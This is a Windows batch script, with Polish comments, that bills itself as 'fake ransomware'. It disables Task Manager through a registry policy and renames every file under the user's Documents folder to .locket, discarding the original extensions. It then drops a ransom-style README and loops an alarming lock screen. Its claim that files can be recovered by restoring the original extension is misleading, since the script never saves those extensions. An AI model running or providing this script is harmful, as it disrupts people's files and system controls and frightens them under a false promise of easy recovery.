@echo off
title RANSOMWARE WARNING!
color 4F
mode 1000
cls

echo =======================================================
echo ==============  ⚠  YOUR FILES ARE LOCKED  ⚠  ==========
echo =======================================================
echo.
echo Your important files have been 'encrypted'! 😈
echo Don't panic, you can recover them by renaming '.locket' to the original extension.
echo.
echo More details in README_LOCKED.txt
echo.
pause

:: Ścieżka do plików
set "TARGET=%USERPROFILE%\Documents"
set "LOCKED_MSG=%TARGET%\README_LOCKED.txt"

:: Blokada Menedżera Zadań (utrudnia zamknięcie skryptu)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Zmiana rozszerzeń na .locket
for /r "%TARGET%" %%F in (*.*) do (
    ren "%%F" "%%~nF.locket"
)

:: Tworzenie notatki z 'żądaniem okupu'
echo YOUR FILES HAVE BEEN LOCKED! > "%LOCKED_MSG%"
echo Change the file extension back to original to recover your files. >> "%LOCKED_MSG%"
echo Thank you for testing fake ransomware 😈 >> "%LOCKED_MSG%"

:: Zapętlenie fałszywego ekranu 'ostrzeżenia'
:loop
cls
echo =======================================================
echo ==============  ⚠  YOUR FILES ARE LOCKED  ⚠  ==========
echo =======================================================
echo.
echo Your important files have been 'encrypted'!
echo Check README_LOCKED.txt for instructions.
echo.
timeout /t 3
goto loop
